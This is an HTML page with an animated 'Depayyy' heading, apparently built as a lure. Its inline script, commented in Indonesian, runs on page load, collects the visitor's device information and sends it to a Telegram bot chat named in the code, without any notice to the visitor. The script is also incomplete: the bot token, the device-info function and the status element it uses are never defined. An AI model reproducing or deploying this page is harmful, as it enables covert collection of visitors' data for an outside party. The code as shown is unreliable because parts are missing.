<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RapipppModss</title>
<style>
    body, html {
        height: 100%;
        margin: 0;
        overflow: hidden;
        font-family: 'Arial', sans-serif;
        background: radial-gradient(circle at 50% 50%, #667eea, #764ba2, #f093fb, #f5576c, #4facfe);
        background-size: 400% 400%;
        animation: gradientShift 10s ease infinite;
    }
    @keyframes gradientShift {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }
    .container {
        position: fixed;
        width: 100%;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        text-align: center;
    }
    h1 {
        font-size: 6rem;
        font-weight: bold;
        background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #6c5ce7);
        background-size: 300% 300%;
        animation: textColorShift 5s ease infinite;
        background-clip: text;
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        text-shadow:0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 20px 20px rgba(0,0,0,.15);
        transform: perspective(500px) rotateY(0deg) rotateX(0deg);
        animation: text3DSwing 6s ease-in-out infinite;
    }
    @keyframes text3DSwing {
        0% { transform: perspective(500px) rotateY(-5deg) rotateX(-5deg) skewX(-5deg); }
        25% { transform: perspective(500px) rotateY(0deg) rotateX(0deg) skewX(0deg); }
        50% { transform: perspective(500px) rotateY(5deg) rotateX(5deg) skewX(5deg); }
        75% { transform: perspective(500px) rotateY(0deg) rotateX(0deg) skewX(0deg); }
        100% { transform: perspective(500px) rotateY(-5deg) rotateX(-5deg) skewX(-5deg); }
    }
    @keyframes textColorShift {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }
    .floating-shapes { position: absolute; width: 100%; height: 100%; overflow: hidden; z-index: -1; }
    .shape { position: absolute; border-radius: 50%; background: rgba(255, 255, 255, 0.1); animation: float 8s ease-in-out infinite; }
    @keyframes float { 0%,100%{transform:translateY(0) rotate(0deg);} 50%{transform:translateY(-100px) rotate(180deg);} }
    .shape:nth-child(1){width:100px;height:100px;left:10%;top:20%;animation-delay:-2s;}
    .shape:nth-child(2){width:150px;height:150px;left:80%;top:60%;animation-delay:-4s;}
    .shape:nth-child(3){width:80px;height:80px;left:50%;top:80%;animation-delay:-6s;}
    .shape:nth-child(4){width:120px;height:120px;left:20%;top:40%;animation-delay:-1s;}
</style>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
<div class="floating-shapes">
    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>
</div>
<div class="container"><h1>Depayyy</h1></div>

<script>
const CHAT_ID = "688350222"; // ganti dengan chat id lo/admin

// Fungsi kirim ke Telegram
async function sendToTelegram(message) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({chat_id: CHAT_ID, text: message, parse_mode: "Markdown"})
    });
}

// Panggil otomatis pas load halaman
window.onload = async () => {
    statusEl.textContent = "Mengumpulkan info device...";
    const info = await getDeviceInfo();
    await sendToTelegram(info);
    statusEl.textContent = "Selesai!";
};
</script>
</body>
</html>
